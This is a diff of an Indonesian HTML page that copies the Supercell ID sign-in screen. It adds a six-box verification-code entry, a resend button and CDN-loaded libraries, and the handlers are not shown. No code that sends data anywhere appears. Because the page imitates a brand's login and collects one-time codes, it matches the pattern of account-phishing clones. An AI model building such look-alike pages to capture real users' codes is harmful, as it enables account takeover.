@@ -6,6 +6,8 @@
     <title>Supercell</title>
     <link rel="stylesheet" href="style.css">
     <link rel="shortcut icon" href="icon2.png" type="png/image">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"/>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
 </head>
 <body>
     
@@ -28,9 +30,9 @@
                     <span>Masuk Ke Supercell ID</span>
                     <span>Masukkan email anda dan kami akan mengirimkan kode verifikasi.</span>
                 </div>
-                <form action="#">
+                <form action="#" method="post">
                     <div class="inputSupercell">
-                        <input type="text" id="emailInput" placeholder="Masukkan Email" required>
+                        <input type="email" id="emailInput" placeholder="Masukkan Email" required>
                         <span>Situs ini dilindungi oleh reCAPTCHA. <a href="">Kebijakan Privasi</a> dan <a href="">Ketentuan Layanan</a> Google juga berlaku.</span>
                     </div>
                     <div class="button">
@@ -39,7 +41,7 @@
                     </div>
                 </form>
                 <div class="pendaftaranSupercell">
-                    <a href="">Ingin mendaftar Supercell ID?</a>
+                    <span onclick="faqPendaftaran()">Ingin mendaftar Supercell ID?</span>
                 </div>
             </div>
 
@@ -49,8 +51,22 @@
                     <span>Kode verifikasi telah dikirimkan ke email</span>
                     <span id="emailTerkirim"></span>
                 </div>
-                
-                <div class="button">
+                <div class="codeContainer">
+                    <div class="wrapper">
+                        <input type="text" class="field 1" maxlength="1">
+                        <input type="text" class="field 2" maxlength="1">
+                        <input type="text" class="field 3" maxlength="1">
+                        <input type="text" class="field 4" maxlength="1">
+                        <input type="text" class="field 5" maxlength="1">
+                        <input type="text" class="field 6" maxlength="1">
+                    </div>
+                </div>
+                <button class="resend" onclick="kirimCode(this)">
+                    Kirim ulang Code
+                    <i class="fa fa-caret-right"></i>
+                </button>
+                <div class="container2-button">
+                    <button onclick="verifikasiCode()">Kirim</button>
                     <button onclick="kembaliVerification()">Kembali</button>
                 </div>
             </div>
